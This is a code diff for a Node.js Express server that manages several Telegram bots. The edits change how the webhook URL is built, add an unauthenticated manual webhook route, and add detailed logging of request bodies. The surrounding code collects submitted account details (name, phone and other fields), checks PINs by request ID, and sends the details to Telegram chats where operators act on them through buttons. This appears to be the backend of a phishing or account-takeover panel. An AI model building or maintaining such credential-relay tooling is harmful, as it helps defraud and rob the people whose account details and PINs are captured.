@@ -35,14 +35,21 @@ Object.keys(process.env).forEach(key => {
 
 console.log('✅ Bots loaded:', bots.map(b => b.botId));
 
-// ---------------- AUTO WEBHOOK SETUP ----------------
+// ---------------- AUTO WEBHOOK SETUP (supports protocol in DOMAIN) ----------------
 async function setWebhook(bot) {
   if (!DOMAIN) {
     console.error(`❌ BACKEND_DOMAIN not set – can't set webhook for ${bot.botId}`);
     return;
   }
 
-  const webhookUrl = `https://${DOMAIN}/telegram-webhook/${bot.botId}`;
+  // If DOMAIN already has http:// or https://, use it directly.
+  // Otherwise, assume it's just a domain and add https://.
+  let baseUrl = DOMAIN;
+  if (!/^https?:\/\//i.test(DOMAIN)) {
+    baseUrl = `https://${DOMAIN}`;
+  }
+
+  const webhookUrl = `${baseUrl}/telegram-webhook/${bot.botId}`;
   try {
     const res = await axios.post(
       `https://api.telegram.org/bot${bot.token}/setWebhook`,
@@ -54,7 +61,7 @@ async function setWebhook(bot) {
       console.error(`❌ Failed to set webhook for ${bot.botId}:`, res.data.description);
     }
   } catch (err) {
-    console.error(`❌ Error setting webhook for ${bot.botId}:`, err.message);
+    console.error(`❌ Error setting webhook for ${bot.botId}:`, err.response?.data || err.message);
   }
 }
 
@@ -64,6 +71,14 @@ async function setWebhook(bot) {
     await setWebhook(bot);
   }
 })();
+
+// ---------------- MANUAL WEBHOOK SETTER (fallback) ----------------
+app.get('/set-webhook/:botId', async (req, res) => {
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.status(404).send('Bot not found');
+  await setWebhook(bot);
+  res.send('Webhook set attempt completed. Check logs.');
+});
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json({ type: '*/*' }));
@@ -119,7 +134,6 @@ app.post('/submit-account', async (req, res) => {
   accountRequests[requestId] = null;
   requestMeta[requestId] = { name, phone, botId };
 
-  // ✅ Telegram message now ONLY shows the 4 fields
   await sendTelegram(
     bot,
 `📋 ACCOUNT DETAILS
@@ -223,14 +237,25 @@ app.get('/check-pin/:id', (req, res) => {
 });
 
 // ============================================================
-//  TELEGRAM WEBHOOK  (handles all callbacks)
+//  TELEGRAM WEBHOOK  (with detailed logging)
 // ============================================================
 app.post('/telegram-webhook/:botId', async (req, res) => {
+  console.log('📨 Webhook received for bot:', req.params.botId);
+  console.log('📦 Body:', JSON.stringify(req.body, null, 2));
+
   const bot = getBot(req.params.botId);
-  if (!bot) return res.sendStatus(404);
+  if (!bot) {
+    console.error('❌ Bot not found:', req.params.botId);
+    return res.sendStatus(404);
+  }
 
   const cb = req.body.callback_query;
-  if (!cb) return res.sendStatus(200);
+  if (!cb) {
+    console.log('ℹ️ Not a callback query – ignoring.');
+    return res.sendStatus(200);
+  }
+
+  console.log('🔄 Callback data:', cb.data);
 
   const [action, requestId] = cb.data.split(':');
   const meta = requestMeta[requestId];
@@ -268,10 +293,16 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     await feedback(bot, meta, msg);
   }
 
-  await axios.post(
-    `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
-    { callback_query_id: cb.id }
-  );
+  // ✅ Always answer the callback – makes the button stop "loading"
+  try {
+    await axios.post(
+      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
+      { callback_query_id: cb.id }
+    );
+    console.log('✅ Callback answered.');
+  } catch (e) {
+    console.error('❌ Error answering callback:', e.message);
+  }
 
   res.sendStatus(200);
 });
